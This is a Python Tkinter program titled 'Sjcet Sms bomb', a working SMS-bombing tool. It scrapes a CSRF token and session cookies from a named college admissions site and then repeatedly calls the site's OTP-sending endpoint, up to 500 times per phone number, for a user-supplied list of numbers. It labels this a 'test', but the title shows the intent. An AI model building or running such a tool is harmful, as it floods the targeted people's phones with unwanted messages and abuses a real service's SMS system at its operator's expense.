import threading
import requests
from bs4 import BeautifulSoup
import tkinter as tk
from tkinter import ttk, messagebox

BASE = "https://apply.sjcetpalai.ac.in"
REGISTER_URL = f"{BASE}/register"
OTP_URL = f"{BASE}/send-registration-otp"

class OTPTester:
    def __init__(self, root):
        self.root = root
        self.root.title("Sjcet Sms bomb💀")
        self.root.geometry("760x620")
        self.root.minsize(620, 500)
        self.root.resizable(True, True)
        self.root.configure(bg="#0f172a")

        self.success = 0
        self.failed = 0

        self.style = ttk.Style()
        self.style.theme_use("clam")

        self.style.configure(".", background="#0f172a", foreground="white")
        self.style.configure("Card.TFrame", background="#1e293b")
        self.style.configure("TLabel", background="#1e293b", foreground="white")
        self.style.configure("Title.TLabel",
                             font=("Segoe UI", 18, "bold"))
        self.style.configure("TButton",
                             font=("Segoe UI", 10, "bold"),
                             padding=8)
        self.style.configure("TEntry",
                             fieldbackground="#334155",
                             foreground="white")

        self.build_ui()

    def build_ui(self):
        card = ttk.Frame(self.root, style="Card.TFrame", padding=20)
        card.pack(fill="both", expand=True, padx=20, pady=20)

        ttk.Label(card,
                  text="Sjcet Sms bomb💀",
                  style="Title.TLabel").pack(anchor="w")

        ttk.Label(card,
                  text="Enter one phone number per line",
                  font=("Segoe UI", 9)).pack(anchor="w", pady=(4, 12))

        self.numbers = tk.Text(
            card,
            height=8,
            bg="#334155",
            fg="white",
            insertbackground="white",
            relief="flat",
            font=("Consolas", 11),
        )
        self.numbers.pack(fill="x", pady=(0, 4))

        numbers_hint = ttk.Label(
            card,
            text="Use one number per line.",
            style="Hint.TLabel",
        )
        numbers_hint.pack(anchor="w", pady=(0, 12))

        row = ttk.Frame(card, style="Card.TFrame")
        row.pack(fill="x", pady=15)

        ttk.Label(row, text="Repeat Count").pack(side="left")

        self.repeat = tk.IntVar(value=5)
        self.repeat_entry = tk.Spinbox(
            row,
            from_=1,
            to=500,
            textvariable=self.repeat,
            width=8,
            bg="#f8fafc",
            fg="#0f172a",
            insertbackground="#0f172a",
            buttonbackground="#cbd5e1",
            relief="flat",
            borderwidth=0,
            font=("Segoe UI", 10),
        )
        self.repeat_entry.pack(side="left", padx=10)

        self.start_btn = ttk.Button(
            row,
            text="Start Test",
            command=self.start_test
        )
        self.start_btn.pack(side="right")

        stat = ttk.Frame(card, style="Card.TFrame")
        stat.pack(fill="x", pady=(0, 12))

        self.success_lbl = ttk.Label(stat, text="Success: 0")
        self.success_lbl.pack(side="left")

        self.failed_lbl = ttk.Label(stat, text="Failed: 0")
        self.failed_lbl.pack(side="left", padx=20)

        ttk.Label(card, text="Live Log").pack(anchor="w")

        log_frame = ttk.Frame(card, style="Card.TFrame")
        log_frame.pack(fill="both", expand=True, pady=(0, 4))

        self.log = tk.Text(
            log_frame,
            bg="#020617",
            fg="#e2e8f0",
            height=18,
            relief="flat",
            font=("Consolas", 10),
        )
        self.log.pack(side="left", fill="both", expand=True)
        log_scrollbar = ttk.Scrollbar(
            log_frame,
            orient="vertical",
            command=self.log.yview,
        )
        log_scrollbar.pack(side="right", fill="y")
        self.log.configure(yscrollcommand=log_scrollbar.set)

    def write_log(self, text):
        self.root.after(0, self._append_log, text)

    def _append_log(self, text):
        self.log.insert("end", text + "\n")
        self.log.see("end")

    def update_counts(self):
        self.root.after(
            0,
            lambda: self.success_lbl.config(text=f"Success: {self.success}"),
        )
        self.root.after(
            0,
            lambda: self.failed_lbl.config(text=f"Failed: {self.failed}"),
        )

    def fetch_tokens(self):
        session = requests.Session()

        session.headers.update({
            "User-Agent": "Mozilla/5.0",
            "Accept": "text/html,application/xhtml+xml",
        })

        r = session.get(REGISTER_URL, timeout=15)
        r.raise_for_status()

        soup = BeautifulSoup(r.text, "html.parser")

        csrf = soup.find("input", {"name": "_token"})["value"]

        xsrf = session.cookies.get("XSRF-TOKEN")
        sess = session.cookies.get(
            "careers_at_sjcet_palai_autonomous_session")

        return session, csrf, xsrf, sess

    def worker(self, numbers, repeat):
        try:
            self.write_log("Fetching fresh session...")

            session, csrf, xsrf, sess = self.fetch_tokens()

            self.write_log("Session got")
            self.write_log(f"XSRF: {xsrf[:25]}...")
            self.write_log("")

            headers = {
                "X-Requested-With": "XMLHttpRequest",
                "Origin": BASE,
                "Referer": REGISTER_URL,
                "Content-Type":
                "application/x-www-form-urlencoded; charset=UTF-8",
                "Accept": "application/json",
            }

            for num in numbers:
                self.write_log(f"Sending sms to {num}")

                for i in range(repeat):
                    try:
                        r = session.post(
                            OTP_URL,
                            headers=headers,
                            data={
                                "_token": csrf,
                                "mobile": num,
                            },
                            timeout=10,
                        )

                        body = r.json()

                        if r.status_code == 200 and body.get("success"):
                            self.success += 1
                            self.write_log(
                                f"  [{i+1}] ✓ {body.get('message')}")
                        else:
                            self.failed += 1
                            self.write_log(
                                f"  [{i+1}] ✗ {r.status_code} {body}")

                    except Exception as e:
                        self.failed += 1
                        self.write_log(f"  [{i+1}] ERROR {e}")

                    self.update_counts()

                self.write_log("")

            self.write_log("Completed.")
            self.root.after(
                0,
                lambda: messagebox.showinfo(
                    "Finished", "sms sent."
                ),
            )

        except Exception as e:
            error_message = str(e)
            self.root.after(
                0,
                lambda: messagebox.showerror("Error", error_message),
            )

        self.root.after(0, lambda: self.start_btn.config(state="normal"))

    def start_test(self):
        numbers = [
            number.strip()
            for number in self.numbers.get("1.0", "end").splitlines()
            if number.strip()
        ]

        if not numbers:
            messagebox.showwarning("Missing numbers", "Enter at least one phone number.")
            self.numbers.focus_set()
            return

        try:
            repeat = self.repeat.get()
        except tk.TclError:
            messagebox.showwarning("Invalid repeat count", "Enter a whole number from 1 to 500.")
            self.repeat_entry.focus_set()
            return

        if not 1 <= repeat <= 500:
            messagebox.showwarning("Invalid repeat count", "Enter a whole number from 1 to 500.")
            self.repeat_entry.focus_set()
            return

        self.success = 0
        self.failed = 0

        self.success_lbl.config(text="Success: 0")
        self.failed_lbl.config(text="Failed: 0")
        self.log.delete("1.0", "end")

        self.start_btn.config(state="disabled")

        threading.Thread(
            target=self.worker,
            args=(numbers, repeat),
            daemon=True,
        ).start()


if __name__ == "__main__":
    root = tk.Tk()
    OTPTester(root)
    root.mainloop()
